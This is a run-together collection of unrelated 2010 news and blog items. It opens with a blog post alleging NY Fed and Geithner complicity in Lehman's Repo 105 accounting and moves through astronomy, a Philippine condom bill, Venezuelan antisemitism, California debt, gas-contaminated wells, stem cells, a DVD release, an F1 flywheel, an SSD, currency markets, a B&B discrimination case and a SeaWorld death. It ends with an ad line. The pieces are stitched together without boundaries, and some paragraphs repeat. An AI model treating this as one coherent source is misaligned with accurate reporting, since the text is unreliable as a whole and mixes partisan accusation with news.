Well , it is folks , as a newly - released examiner ’s report by Anton Valukas in connection with the Lehman bankruptcy makes clear .
The unraveling is n’t merely implicating Fuld and his recent succession of CFOs , or its accounting firm , Ernst & Young , as might be expected .
It also emerges that the NY Fed , and thus Timothy Geithner , were at a minimum massively derelict in the performance of their duties , and may well be culpable in aiding and abetting Lehman in accounting fraud and Sarbox violations .
We need to demand an immediate release of the e-mails , phone records , and meeting notes from the NY Fed and key Lehman principals regarding the NY Fed ’s review of Lehman ’s solvency .
If , as things appear now , Lehman was allowed by the Fed ’s inaction to remain in business , when the Fed should have insisted on a wind - down ( and the failed Barclay ’s said this was not infeasible : even an orderly bankruptcy would have been preferrable , as Harvey Miller , who handled the Lehman BK filing has made clear ; a good bank / bad bank structure , with a Fed backstop of the bad bank , would have been an option if the Fed ’s justification for inaction was systemic risk ) , the NY Fed at a minimum helped perpetuate a fraud on investors and counterparties .
This pattern further suggests the Fed , which by its charter is tasked to promote the safety and soundness of the banking system , instead , via its collusion with Lehman management , operated to protect particular actors to the detriment of the public at large .
And most important , it says that the NY Fed , and likely Geithner himself , undermined , perhaps even violated , laws designed to protect investors and markets .
If so , he is not fit to be Treasury secretary or hold any office related to financial supervision and should resign immediately .
I am reading the report , and will provide an update later , but here are the key bits ( hat tip reader John M ) .
As much as Karl Denninger has done some terrific initial reporting , he does not go far enough as far as the wider implications are concerned .
The key revelation is that Lehman as of late 2007 was routinely using repo transactions at the end of the quarter to mask how levered it truly was :
Lehman regularly increased its use of Repo 105 transactions in the days prior to reporting periods to reduce its publicly reported net leverage and balance sheet .
2850 Lehman ’s periodic reports did not disclose the cash borrowing from the Repo 105 transaction – i.e. , although Lehman had in effect borrowed tens of billions of dollars in these transactions , Lehman did not disclose the known obligation to repay the debt .
2851 Lehman used the cash from the Repo 105 transaction to pay down other liabilities , thereby reducing both the total liabilities and the total assets reported on its balance sheet and lowering its leverage ratios .
Yves here .
The stunning bit is these “ repos ” were actually a conventional type of repo , despite the name , but Lehman was engaging in blatant misreporting , treating these “ repos ” ( in which a bank still shows them on its balance sheet as sold with the obligation to repurchase ) as sales .
Note that at the time ( as the report notes ) analysts and others kept probing at the seeming miracle of Lehman ’s deleveraging in a difficult market .
This ruse may also square the circle on a Lehman leak we broke in 2007 .
A former Lehman MD had reported that most of the deleveraging that had occurred at the end of 2Q 2008 had resulted from the placement of $ 55 billion of assets with newly - formed entities in which Lehman retained a 45 % ownership interest and were operated by former Lehman employees .
To put it mildly , these were off balance sheet entities that strained the idea of independence .
Bloomberg got hold of the story , and Lehman asserted that only $ 5 billion of assets had actually been transferred .
I am now wondering whether the $ 55 billion were indeed transferred precisely as the source had said originally ( he in turn had been told this by several people at Lehman ) but that most of it was via this type of repo , and then re-materialized on Lehman ’s balance sheet once the quarter end had passed ( the Examiner ’s report notes that the amount that Lehman moves off its balance sheet at the end of 2Q 2008 was $ 50.38 billion , which tallies with the difference between what the Lehman MD said had been moved off balance sheet versus what they fessed up to when asked by Bloomberg ) .
Denninger raises one question : were other banks engaging in this type of accounting chicanery ?
But there is another question : did some of Lehman ’s counterparties must have suspected what was going on , given that this took place on a large scale basis at the end of every quarter ?
How many had an idea that Lehman was engaging in massive window dressing and chose to play along ?
But here is the part of the report that discussed how the Fed aided and abetted Lehman misconduct :
the Examiner questioned Lehman executives and other witnesses about Lehman ’s financial health and reporting , a recurrent theme in their responses was that Lehman gave full and complete financial information to Government agencies , and that the Government never raised significant objections or directed that Lehman take any corrective action .
Yves here .
So get this : even though Lehman dressed up its accounts for the great unwashed public , it did not try to fool the authorities .
Its games playing was in full view to those charted with protecting investors and the financial system .
So what transpired ?
The SEC ( which in all fairness , has never had much expertise in credit markets , this is a major regulatory problem ) handed assessing Lehman over to the Fed , which bent over backwards to give it a clean bill of health :
After March 2008 when the SEC and FRBNY began onsite daily monitoring of Lehman , the SEC deferred to the FRBNY to devise more rigorous stress‐testing scenarios to test Lehman ’s ability to withstand a run or potential run on the bank .
5753
The FRBNY developed two new stress scenarios : “ Bear Stearns ” and “ Bear Stearns Light . ” 5754 Lehman failed both tests .
5755
The FRBNY then developed a new set of assumptions for an additional round of stress tests , which Lehman also failed .
5756 However , Lehman ran stress tests of its own , modeled on similar assumptions , and passed .
5757
It does not appear that any agency required any action of Lehman in response to the results of the stress testing .
Yves here .
So get this : the stress tests were a sham .
Only one outcome was permissible : that Lehman pass .
So after the Fed was unable to come up with an objective - looking stress test that Lehman could satisfy , they permitted Lehman to devise a test with low enough standards to give itself a clean bill of health .
So why should we trust ANY government designed stress test , particularly when the same permissive grader , Timothy Geithner , was the moving force behind the ones dreamed up last year , which have been widely decried by banking experts , including Bill Black , Chris Whalen , and Josh Rosner ?
We linked to a simple analysis by Mike Konczal that demonstrates that for the biggest four banks alone , merely on their second mortgage portfolios , the stress tests of 2009 were too permissive to the tune of at least $ 150 billion .
Lehman type accounting , in other words , is being institutionalized , with the active support from senior government officials .
It is time for Geithner to go .
He is not fit to serve as Treasury secretary .
And the time is overdue for a full audit of the Fed , and in particular the New York Fed , from the start of the Bear crisis through and including all the retrades of the AIG bailout .
Update 12:00 AM , 3/12/10 .
Oh , boy , the spin is in in the US .
Bloomberg focuses on an interesting revelation in the report , but which strikes me as secondary , that JP Morgan and Citi delivered the fatal blow to Lehman by withholding collateral .
That JP Morgan seized $ 17 billion of collateral has been reported elsewhere ; the only new elements are Citi ’s role and that its and JPM ’s actions could serve as grounds for legal action :
“ There are a limited number of colorable claims for avoidance actions against JPMorgan and Citibank , ” Valukas said in the report .
He defined a colorable claim as sufficient credible evidence to persuade a jury to award damages at trial .
The Times pointed ignores the Fed ’s lapses , as does the Journal and the major report at the Huffington Post .
Update 3:00 AM .
Have now read the germane section a bit ( over 300 pages , please do not bust my chops ) .
Every page is stunning ( the law firm did a great job , this is one case where big fees are associated with big time value ) .
The nonsense is mile high .
Lehman had been doing this sort of thing since 2001 .
No US law firm would give them cover via an opinion letter for their phony repo accounting , they managed to get the opinion they sought in the UK and accordingly shuffled assets through the UK for the repo 105 transactions .

Explanation : Only 11 million light - years away , Centaurus A is the closest active galaxy to planet Earth .
Spanning over 60,000 light - years , the peculiar elliptical galaxy , also known as NGC 5128 , is featured in this sharp color image .
Centaurus A is apparently the result of a collision of two otherwise normal galaxies resulting in a fantastic jumble of star clusters and imposing dark dust lanes .
Near the galaxy 's center , left over cosmic debris is steadily being consumed by a central black hole with a billion times the mass of the Sun .
As in other active galaxies , that process likely generates the radio , X -ray , and gamma- ray energy radiated by Centaurus A .

By By Leo Reyes Mar 6 , 2010 in Health A Philippine lawmaker is being criticized by the influential Catholic bishops for supporting a bill in congress that would promote the use of condom as a way of protection from the spread of HIV / AIDS and other sexually - transmitted diseases .
Rep. Janet Garin said the Catholic church is misleading the public by claiming that the use of condom will not guaranty users against unwanted pregnancy , transmission of AIDS / HIV and sexually - transmitted diseases .
On the contrary , the lady physician and lawmaker said that the World Health Organization ( WHO ) has even recommended the use of condoms for the protection of HIV and sexually - transmitted diseases .
In the Philippines , the use of condom is being supported by the government to prevent the spread of sexually - transmitted diseases .
The Department of Health had in fact spearheaded the use of condom in its recent valentine day campaign where condoms were given free to couples who bought flowers in a popular flower shop in Manila .
Some government officials also claimed the use of condoms controls population growth in slum areas and in the countryside .
Dr. Esperanza Cabral , the current health department secretary is under fire from the influential Catholic bishops of the Philippines for her efforts in promoting condoms as a way of protecting the general public from HIV and other sexually - transmitted diseases .
Garin said that the “ The Catholic bishops must not impose their personal beliefs on our government officials and the people .
They must let the Department of Health do its work , and , above all , they must immediately refrain from spreading baseless information that will impact on the health of the people , ” she added .
The Roman Catholic church in the Philippines maintains that use of condoms is against the Catholic hierarchy 's stand on artificial contraception .
It says the government is not concerned about morality , adding that it considers humanity as a commodity .
The Roman Catholic church in the Philippines is opposing the Philippine reproductive health bill being supported by a congresswoman who is also a medical doctor .
Rep. Janet Garin said the Catholic church is misleading the public by claiming that the use of condom will not guaranty users against unwanted pregnancy , transmission of AIDS / HIV and sexually - transmitted diseases .
On the contrary , the lady physician and lawmaker said that the World Health Organization ( WHO ) has even recommended the use of condoms for the protection of HIV and sexually - transmitted diseases .
In the Philippines , the use of condom is being supported by the government to prevent the spread of sexually - transmitted diseases .
The Department of Health had in fact spearheaded the use of condom in its recent valentine day campaign where condoms were given free to couples who bought flowers in a popular flower shop in Manila .
Some government officials also claimed the use of condoms controls population growth in slum areas and in the countryside .
Dr. Esperanza Cabral , the current health department secretary is under fire from the influential Catholic bishops of the Philippines for her efforts in promoting condoms as a way of protecting the general public from HIV and other sexually - transmitted diseases .
Garin said that the Roman Catholic leaders distract career officials serving the country by imposing their personal beliefs on public servants .
“ The Catholic bishops must not impose their personal beliefs on our government officials and the people .
They must let the Department of Health do its work , and , above all , they must immediately refrain from spreading baseless information that will impact on the health of the people , ” she added .
The Roman Catholic church in the Philippines maintains that use of condoms is against the Catholic hierarchy 's stand on artificial contraception .
It says the government is not concerned about morality , adding that it considers humanity as a commodity .

A report by the human rights watchdog of the Organization of American States warns of a possible “ threat to the life and physical integrity of the Jewish community in Venezuela ” due to the Chavez regime ’s violations of the political and human rights of its citizens .
In a lengthy report publicized in late February , the Inter - American Commission on Human Rights ( IACHR ) accused the government of Venezuela of fostering an atmosphere of “ political intolerance ” and “ a climate hostile to the free exercise of dissenting political participation .
” It blasted the prevailing “ citizen insecurity ” in the country and saved its harshest criticism for “ the prevailing impunity affecting cases of human rights violations , ” including in cases of police misconduct , abuse of authority , and even torture .
The Washington - based IACHR is an organ of the Organization of American States that monitors and investigates violations of human rights among the international umbrella ’s members .
The information on the situation of the Jewish community comes in part from Venezuelan governmental sources , and in part from concerned Jewish groups such as B’nai B’rith International and The Coalition for Jewish Concerns – Amcha , a US - based network that advocates “ on behalf of endangered Jews .
” Beginning in paragraph 780 of the report , which is available online at the IACHR ’s Web site , the commission expressed “ concern ” over “ reports claiming that the Jewish community in Venezuela is being especially affected by violent incidents .
” Citing anti-Semitic discourse in media and among state officials , combined with vandalism and an “ unexplained ” raid by Venezuelan police , the report concludes that such incidents contribute “ to creating an atmosphere of intimidation and violence against the Jewish community in Venezuela .
“ The foregoing , added to the lack of investigation and sanctioning of those responsible for these acts , including those in which state forces participated , constitutes a threat to the life and physical integrity of the Jewish community in Venezuela .
” According to Amcha ’s Rabbi Shmuel Herzfeld , “ the Venezuelan government would have us believe [ these incidents ] were committed by a bunch of thugs , and this document , written on OAS stationery , says otherwise .
” Amcha has submitted a request to hold additional hearings on the matter , and Herzfeld is hopeful these will take place by October .
The report devotes two long paragraphs to a December 2007 police raid at Caracas ’s Hebrew Social , Cultural , and Sports Center , which the Venezuelan state claimed was meant to find “ evidence of criminalistic interest related to the alleged commission of a crime against public order , the community , or national security .
” According to the IACHR report , “ the information furnished by the State regarding the operation at the Hebrew Center is inadequate to explain the incident that occurred at the institution ’s headquarters .
” The report went on to cite the growth in recent years of official and media rhetoric that is “ anti-Semitic in tone , ” noting a speech delivered by President Hugo Chavez in 2005 that accused “ some minorities , the descendants of those who crucified Christ , the descendants of the same who threw Bolívar out of here and they also crucified him in their way in Santa Marta , there in Colombia , ” of “ [ seizing ] the planet ’s gold , silver , minerals , water , good land , petroleum , riches , and [ concentrating ] the riches in a few hands .
” This , combined with similar statements by other government officials , were followed by “ expressions with anti-Semitic content in opinionprograms and articles , including in government - controlled media ormedia aligned with the government such as Cadena Venezolana deTelevisión ( VTV ) .
” The commission vowed to keep track of stepstaken by Venezuelan authorities “ to keep such violent acts against the Jewish community in Venezuela from reoccurring , to establish the truthabout the incidents , and to punish the guilty . ”
With Greece getting all the imminent default attention , have we forgotten California ?
Jim Grant chimes in .
Greece : 3 % of Eurozone GDP
California : 13 % of USA GDP
Rate Curves :
Greece
3 year : 3.45 %
30 year : 6.26 %
5 Year CDS : 400 +
California
3 year : 1.89 %
30 year : 5.59 %
5 Year CDS : 333
Grant points out Trichet 's Jan 14 commentary : " belonging to the euro area , you have an easy means of financing your current account deficit .
You share a currency that is credible , so that you have a quality of financing that corresponds to that of a credible currency . "
Further : " this should be borne in mind , compared with the share of CALIFORNIA , FOR INSTANCE , in the overall GDP of the USA . "
Grants reviews CA 's Baa1/ A- rating as the worst in the US , the S&P downgrade and the structural not cyclical problem of California .
State Revenue up 22 % in decade debt service cost +143 % .
Interest expense to consume 10 % of revenues by 2013 .
Howerver Grant 's notes that Californida 's debt / gdp ratio of " perhaps 25 % is dwarfed by Greece 113 % "
Yet as Zero Hedge has pointed out how much does a standalone credit metric such as a state 's GDP truly matter ?
We know CA 's trust fund when it comes to funding unemployment benefits is now empty and every month sees greater borrowings from the Treasury .

We expect once the rumored cabal of Goldman and Soros finish their toying with Greece , they will look into the US .
Then again , for fears of retribution by the President once it becomes known that a " US bank " ( or hedge fund ) is actively pushing CA CDS wider , this may be one of the most mispriced securities currently available .
To those not fearing the wreath of the UAW , it may be worth the gamble on the short risk side .
Candor , NY -- Fred Mayer holds a lighter to his faucet , lets the water run , and — pow — the flow ignites into a small fireball .
“ I can wash my dishes and poach an egg at the same time , ” he joked .
But it ’s no laughing matter .
Mayer ’s faucets spew natural gas .
The gas has polluted his water supply , forcing Mayer to buy bottled water to drink .
If enough gas builds up in his faucets or walls , scientists warn , Mayer ’s house could explode .
Outside , the stream where Mayer once caught trout , minnows and crayfish bubbles and spurts , Mayer said .
The stream is belching gas .
The fish are mostly dead , he said .
Mayer , 59 , a disabled Vietnam veteran , lives in Candor , a rural town in Tioga County , between Ithaca and Binghamton .
He has lived in the same house since 1962 .
He has used the same drinking water well since 1966 .
The problems with his water started about three years ago , he said .
Mayer blames his flammable faucet on natural gas drilling near his home .
Fortuna Energy Inc. , the largest natural - gas company in New York , began drilling in Tioga County in late 2003 , company lawyer and spokesman Mark Scheuerman said .
“ I never had a problem , ” Mayer said .
“ The gas was n’t here before .
Then all of a sudden the drilling starts happening and wham , bam . ”
Fortuna denies any link between Mayer ’s water problems and the company ’s drilling .
The state Department of Environmental Conservation , although it never visited Mayer ’s home , concluded the gas was naturally occurring and decided no investigation was needed .
Independent scientists say the cause of the gas might never be known .
Natural gas trapped in shale formations buried deep underground can seep into pipes and homes naturally , said William Kappel , a hydrogeologist with the U.S. Geological Survey .
But there have been documented cases where drilling has released gas that has migrated into wells and bodies of water miles away , he said .
“ There ’s no smoking gun either way on this , ” Kappel said .
“ It ’s very difficult to assess cause and effect .
The potential for gas migration ( from drilling ) is generally pretty small ... but it ’s not impossible . ”
There ’s no drilling on Mayer ’s property or even next door .
The closest gas wells are 5 and 7 miles away , according to the DEC .
The one 7 miles away has not yielded any gas since it was drilled in 2006 , said Yancey Roy , who speaks for the DEC .
“ It is highly improbable that other wells located more than 7 miles away caused Mr. Mayer ’s problem , ” Roy said .
Scheuerman said Fortuna operated “ many successful wells ” near Mayer ’s home from 2004 to 2008 , including in the Spencer and Owego areas .
Spencer is about 8 miles west of Candor ; Owego is about 10 miles south .
All of the wells tapped into the Trenton - Black River Formation .
Scheuerman said his company used horizontal drilling to unleash the gas , but the DEC said no hydrofracking was used in the two wells closest to Mayer ’s house .
Fortuna has since stopped drilling in Spencer and into the Trenton - Black River Formation .
No more wells are planned , Scheuerman said .
“ We are focused exclusively on development of the Marcellus Shale , ” he said .
The DEC has prohibited drilling in the Marcellus Shale until an environmental review is complete .
That is likely to be months away .
But environmental advocates fear that without strict regulations on gas drilling and enough regulators to oversee the process , incidents like Mayer ’s will become more common .
“ I think he is an indication of the shortcomings of the regulatory situation , ” said Walter Hang , of Toxics Targeting , an environmental group based in Ithaca .
“ When people report these problems , they do n’t get the response the public would normally expect . ”
Mayer called the DEC to report his ignitable water Jan. 26 , 2009 .
He told agency officials he was concerned about natural gas drilling taking place near his home , according to a DEC report .
The DEC told him to vent his well , the report says .
Mayer said the DEC never came to his house to investigate .
Roy said the agency decided no investigation was needed because of the distance between Mayer ’s house and the drilling , the timing of the complaint and the fact that no other residents closer to the drilling reported well contamination .
Roy said the DEC received a complaint about gas in a water well in Newark Valley , about 8 miles east of Candor , in July 1999 .
There was no natural - gas drilling taking place then in Tioga County or neighboring Broome County , he said .
“ This could indicate that the methane occurrence in Mr. Mayer ’s well is not unique to his property or area , ” Roy said .
“ Natural gas in water wells commonly occurs throughout the state . ”
Roy said the DEC has received no other reports of gas contamination in the area of Mayer ’s home , although he noted that the DEC would be aware of problems only if residents report them .
Officials with the Tioga County Health Department said they have received no complaints about well contamination .
The group Tioga Investigates Natural Gas — made up of representatives from the county Legislature , Council of Governments and several other civic , business and environmental agencies — notes on its
Web site that “ there is a community concern that private wells may be affected by the natural gas drilling . ”
Kappel , of the USGS , said it ’s possible for different wells to react differently to natural gas because of geology and water levels across an aquifer .
Gas could seep into one well , while keeping clear of a neighboring well , he said .
He also pointed out that changing water levels could cause more gas to evolve than when a well was drilled , leaving the door open to the possibility that Mayer ’s gas problem is naturally occurring .
Mayer said he also complained to Fortuna .
The company referred him to the DEC , he said .
Scheuerman said Fortuna records show that Mayer called in January but complained about lease payments , not water quality .
Mayer ’s father had signed a drilling lease with Fortuna before he died .
There has been no drilling on Mayer ’s 97 - acre property , but Mayer receives rental payments from Fortuna .
Mayer said he renegotiated the terms in January to bump his payments from about $ 400 a year to about $ 57,000 a year .
Mayer said he was trying only to secure payments that fall in line with his neighbors ’ .
He insists he complained to Fortuna about his water , as well .
Without spending thousands of dollars to fingerprint the gas in his well , Mayer will likely never find where it came from .
But even answers , he said , would n’t calm his frustration and anger .
“ It ’s very disheartening to me , ” Mayer said , “ knowing that the environment that I grew up in is going to pieces . ”

Unnatural gas in wells
U.S. Geological Survey hydrogeologist William Kappel says natural gas in water wells is not uncommon .
It can occur naturally or result from drilling for natural gas .
Here ’s a look at several instances in which gas drilling appears to be to blame .
Seeping gas :
In February , the Pennsylvania Department of Environmental Protection ordered Cabot Oil and Gas Corp. to install methane detectors in nine homes in Dimock , Pa. , and to provide alternative water sources to residents of four homes .
The department found Cabot had caused or allowed natural gas to seep into the homes ' groundwater supplies .
More methane : A couple in Fort Lupton , Colo. , discovered last year they could set their tap water on fire .
At the urging of the Colorado Oil and Gas Commission , two gas companies drilling nearby agreed to install a water treatment system in their home .
Commission members reported several dozen other instances of natural gas migration into homeowners ' water over the past decade .
" There is a ... trend of increasing methane in groundwater samples over the last seven years that is coincident with the increased number of gas wells installed , " a scientific report conducted for Garfield County concluded .
Explosion in Ohio : The Ohio Department of Natural Resources concluded in 2008 that 22 private wells and one public water supply were contaminated by natural gas because hydrofracking and a faulty well casing allowed methane into an aquifer .
The department investigated after a house exploded .
Migrating gas :
In 1996 , during the drilling of a gas well in Freedom , Cattaraugus County , gas escaped through a fault in the shale and traveled a mile and a half down the road , migrating into ponds , road ditches , homes and wells , according the state Department of Environmental Conservation .
Twelve families were evacuated .
LONDON ( Reuters ) - Scientists have found the “ mother , ” or origin , of all skin cells and say their discovery could dramatically improve skin treatments for victims of serious wounds and burns .
Hans Clevers and a team of Dutch and Swedish researchers conducted a study in mice and found that the stem cell that gives produces all the different cells of the skin actually lives in hair follicles .
The findings , which they say will translate for human use , mean it may be possible to harness these stem cells to help with wound repair or skin transplants for burns victims , they said in a study in the Science journal on Thursday .
“ This is the mother of all the stem cells in the skin -- it makes all the other stem cells , ” Clevers , of the Royal Netherlands Academy of Arts and Sciences in Utrecht , told Reuters in a telephone interview .
“ The same stem cells exist in humans , we can see them , and the promise is that these cells are probably going to be much better than anything we have had to date at making new skin . ”
The skin has three different populations of cells -- hair follicles , moisturizing sebaceous glands , and the tissue in between , known as the interfollicular epidermis .
Stem cells are original cells , or drivers , from which all human cells develop .
Scientists had previously thought that stem cells in each of these three skin populations were capable of producing their own cell type , but until now , a “ mother ” stem cell which produces all three types had not been found .
Clevers ’ team found that a group of stem cells that live in hair follicles and which have high levels of a gene called Lgr6 are the original epidermal stem cells .
In tests on mice with wounds , they found that Lrg6 cells around the wound drove new skin growth and repaired the skin .
Scientists are already able to grow new skin in laboratories using tissue from existing skin cells from patients who have been badly burned , but the new skin is often brittle , dry and does not have hair -- making it look unusual .
Clevers said the advantage offered by the “ mother ” stem cell finding would be that they could grow skin from its original basis -- allowing it to be “ real new skin ” with moisture from sebaceous glands and the ability to grow hair .
He said researchers now need to learn how to isolate the Lrg6 cells from human skin .
That could take 2 to 3 years .
“ We are learning how to grow the mouse cells in culture .
Once we know how to do this and can isolate the human variant , we should be able to grow human cells as well , ” he said .
“ Since there is a lot of experience already with growing and transplanting skin for burn wound patients , it should be relatively easy to incorporate the new stem cells ... and conduct trials in patients . ”
One of the most - demanded TV shows for a DVD release is finally set to arrive as the appropriately named TVShowsonDVD.com has announced that Daria : The Complete Animated Series will hit DVD on May 11th .
The episodes will be in full screen , but there are currently no details on the audio , the price ( like that will stop you from buying it ) , how many songs they were able to get the licensing rights for , or the package art .
However , we do know the special features for the set , and I ’ve included the list after the jump .
Again , you ’re due to stand on my neck on May 11th .
Here ’s the list of special features you ’ll find on the set :
– All Five Seasons plus Both Movies ( that adds up to 1606 minutes of brilliant )
– The Five - Minute Pilot , “ Sealed with a Kick ”
– Mystik Spiral Music Video , “ Freakin’ Friends ”
– Daria Day Intros
– Top Ten Video Countdown Hosted by Daria & Jane
– Cast & Crew Interviews
– Never Before - Seen Mystik Spiral spin - off script
While Mike Judge ’s Beavis and Butthead may have the greater name recommendation , I believe its spinoff , Daria , has a more devout following of fans .
Rather than trying to just be another Beavis and Butthead , Daria went in a completely different direction , going with sardonic wit and satire over needing “ tee - pee for my bunghole . ”
The benefit of a larger and diverse cast of characters helped the show by offering viewers a variety of choices of personal favorites ( mine : Daria ’s Dad , Jake ) .
Hopefully , the price of this set wo n’t be insane , but it ’s hard to argue that it wo n’t be worth it .
Of course , part of the delay is due to trying to regain the use of songs used in the show .
I ’m not sure if they got them all , but I do n’t think that ’s a huge deal breaker .
I am impressed that they got Daria and Jane ’s top ten countdown , although TVShowsonDVD does n’t specify if the music videos are actually included or if it will just be the interludes of Daria and Jane being sardonic and awesome .
At the the end of last season there was a rumour that I picked up suggesting that Williams was negotiating with Porsche .
I could not stack it up and so I wrote a very general story about Porsche and Formula 1 , just in case .
It now seems that there were serious contacts going on but not apparently relating to Formula 1 ( although , who knows where this might lead ? ) .
The Grove team has just announced a deal between Williams Hybrid Power Ltd and Porsche AG regarding the flywheel system that is to be used on the new Porsche 911 GT3 R Hybrid , which was announced today ( below ) .
The system was originally developed for use in F1 by Williams but the focus is now on applying on the technology to road cars .
The technology will also be developed for larger , infrastructure applications by Williams F1 at its new research facility in the Qatar Science and Technology Park .
“ This is a milestone for both Williams Hybrid Power ( WHP ) and Williams F1 , ” says the team ’s COO Alex Burns , who is also chairman of Williams Hybrid Power .
“ Together we have worked to bring this technology forward to the point where it can be tested in a racing car and deployed in a road car .
We hope that this will be just the start of the evolution of hybrid systems developed for Formula 1 moving across to applications where they can contribute to cleaner and more powerful vehicles . ”
The Williams system is patented and features an electromechanical composite flywheel system that provides a high - power , cost - effective and environmentally friendly solution for mobile or stationary energy storage and recovery .
In November , WHP announced its involvement in a mild hybrid road car programme with Ricardo , CTG , JCB , Jaguar Land Rover , SKF and Torotrak .
The project aims to demonstrate the potential of flywheel - based hybrid systems with the potential for 30 per cent fuel savings ( and equivalent reductions in CO2 emissions ) at an on -cost of less than £ 1000 , to enable mass - market uptake of hybrid vehicles in price sensitive vehicle applications .
OCZ Colossus 1TB SSD gets official
Call your SSD “ Colossus ” and you ’ll be expected to back that up with some hard figures , and OCZ have certainly managed to do that .
The OCZ Colossus 3.5 - inch SSD packs up to 1TB of storage , and while it ’s taken more time than expected for them to reach the market – we first caught sight of them in June – anybody hoping for speedy , solid - state capacity should find something to satisfy .
The 1TB flagship manages an even 260 MB /s for both maximum read and write speeds , together with 220 MB /s for sustained write speeds .
OCZ reckon it ’ll go 1.5 m hours between failures , and offer a standard 3 - year warranty .
OCZ ’s press release does n’t mention pricing for the Colossus , but back in August ( when we were told the drives were just a month away from release ) they did make some figures public .
Four models will be available : the Colossus 120 ( 128GB , 250 ( 256GB ) , 500 ( 512GB ) and 1TB ( 1024GB ) priced at $ 300 , $ 650 , $ 1,200 and $ 2,200 respectively .
Press Release :
* Greek worries remain key market focus
* Focus on EU summit next week to see if Greece gets aid
* Euro / Swiss franc tumbles to 17 - month low ( Adds comment , updates prices )
NEW YORK , March 19 ( Reuters ) -
The euro fell to its lowest level against the dollar in more than two - weeks on Friday , pressured by persistent worries about Greece ’s debt problems as traders waited to see if the country can secure aid from euro zone members at a summit next week .
The European single currency , on track for its worst weekly performance since late January , had weakened on Thursday after a published report saying the country saw limited prospects for euro zone assistance heightened uncertainty about Greece ’s ability to service its debts .
“ The tensions surrounding Greece are escalating .
This whole IMF situation has become a game of brinkmanship and the whole uncertainty is undermining the euro , ” said Michael Woolfolk , senior currency strategist , at BNY Mellon in New York .
Greece said on Thursday it could not achieve promised deficit cuts if borrowing costs remained high , and it might have to turn to the International Monetary Fund .
[ ID:nLDE62H0LL ] .
Greece , however , dismissed a news report that it was planning to turn to the global lender as soon as early April if European Union leaders do not agree on a rescue plan next week .
“ Greece is doing all the right austerity measures , but it is paying 300 basis points above German bunds and that ’s just not possible .
So it ’s creating an untenable conflict among the members , ” said Boris Schlossberg , director of FX research at GFT in New York .
The premium investors demand to buy 10 - year Greek government bonds over German benchmarks continued to rise on Friday . [ n LDE62I0 PK ] .
In midday New York trading , the euro EUR= slid 0.6 percent on the day to $ 1.3515 after hitting its lowest level in more than two weeks at at $ 1.3502 , according to Reuters data .
" I really do n't see any support for the euro .
We may have to test that low below $ 1.3450 in the near term , " Woolfolk said , adding investors also need to watch the Dow industrials stock index .
DJIA .
“ The Dow is down and that reflects risk aversion , ” he said .
“ The Dow is due for profit taking and now is a good time because there are renewed European worries going into the weekend , ” suggesting that the euro would fall further if the Dow declines .
The euro EURCHF= was down 0.2 percent against the Swiss franc to trade at 1.4367 francs .
Earlier , it fell to 1.4320 francs , its weakest since October 2008 in the aftermath of hawkish comments from a Swiss National Bank official .
SNB board member Jean - Pierre Danthine said on Thursday that Swiss firms and consumers should prepare for rising borrowing costs and exchange rates determined by the market as interest rates could not stay low forever .
[ ID: nLDE62H2EE ]
Traders are focusing on the 1.4300 area , the record low , as the next support level .
Options structures were said to be prevalent at that level .
The SNB ’s statement last week made no change to its pledge to counter excessive gains in the franc as it continues to appreciate against the euro .
The dollar was broadly supported , up 0.7 percent against a currency basket to 80.814 , and traded at 90.51 yen against the Japanese currency JPY= , up 0.2 percent on the day .
Sterling fell 1.5 percent versus the dollar GBP=D4 to $ 1.5021 , undermined by remarks from Bank of England policy maker Andrew Sentance that there was some risk of a double - dip recession in the UK .
[ ID : nLDE62I055 ]
The Canadian dollar earlier gained after Canadian core inflation unexpectedly rose in February .
[ ID : nOTT003885 ] .
It earlier hit a 20 - month high versus the U.S. dollar CAD= D4 at C$ 1.0062 , but the greenback recovered to trade up 0.1 percent at C$ 1.0153 .

A gay couple were turned away from a Berkshire guest house by the owner who said it was " against her convictions " for two men to share a bed .
Michael Black and John Morgan , from Brampton , Cambridgeshire , had booked a double room at the Swiss B&B , Terry 's Lane , in Cookham , for Friday night .
But when they arrived owner Susanne Wilkinson refused to let them stay .
She admitted she did turn the couple away because it was against her policy to accommodate same sex couples .
She said if we'd told her in advance she would have told us not to come
Michael Black
The couple have now reported the matter to Thames Valley Police .
Under the Equality Act 2006 it is illegal to discriminate against people on the grounds of sexual orientation .
Ms Wilkinson told the BBC : " They gave me no prior warning and I could n't offer them another room as I was fully booked .
" I do n't see why I should change my mind and my beliefs I 've held for years just because the government should force it on me .
" I am not a hotel , I am a guest house and this is a private house . "
Mr Black and Mr Morgan were in the village , near Maidenhead , to meet some friends for dinner and to see a local play .
Mr Black told the BBC : " We 're two respectable middle - aged men - John is leader of the Lib Dem group on Huntingdon Town Council .
Owner apologised " This was the first time either of us had experienced homophobia at first hand , despite being aged 56 and 62 .
We were shocked and embarrassed .
" Mrs Wilkinson saw us both before we got out of the car and immediately acted in an unwelcoming , cold way , but my boyfriend and I were polite and friendly .
" She said if we 'd told her in advance she would have told us not to come .
" She apologised for turning us away .
I asked for a refund of the deposit , which she gave me without quibble .
" We stayed polite and , to be fair , she was n't rude or abusive .
' Civil matter '
" All she said about her reasons for turning us away was that it went against her convictions for us to stay there .
" We 've since told a large number of friends and acquaintances and the reaction has consistently been amazement that this should have happened .
" I 've reported the matter to Thames Valley Police who have confirmed that they are following it up . "
Thames Valley Police said the call had been logged as a homophobic incident .
A spokeswoman said : " As the people live outside of the force area , we have asked Cambridgeshire Constabulary to speak to the individuals concerned . "
A spokesman for Stonewall , which campaigns for equality and justice for lesbians , gay men and bisexuals , said turning someone away on the grounds of sexual orientation was illegal .
Derek Munn , director of public affairs , said : " Stonewall was delighted when the law changed in 2007 so that lesbian and gay couples could go on their holidays like anyone else .
" In open and shut cases of discrimination on the grounds of sexual orientation the law 's quite clear - it 's illegal for businesses to turn away gay customers or discriminate against them when providing goods or services , and this can't be overridden by personal prejudice . "

ORLANDO , Florida ( AP ) – A killer whale has attacked and killed a trainer in front of a horrified audience at a show at SeaWorld in Orlando , Florida , with witnesses saying the animal involved in two previous deaths dragged her under and thrashed her around violently .
Distraught audience members were hustled out of the stadium Wednesday afternoon , and the park was immediately closed .
ADVERTISEMENT
Veteran trainer Dawn Brancheau was one of the park ’s most experienced .
It was n’t clear if she drowned or died from the thrashing .
SeaWorld spokesman Fred Jacobs confirmed the whale was Tilikum , one of three orcas blamed for killing a trainer who lost her balance and fell in the pool with them in 1991 at Sealand of the Pacific in Victoria , British Columbia .
Tilikum was also involved in a 1999 death at Orlando SeaWorld .
Prepare Now to Escape Obama 's Retirement Trap
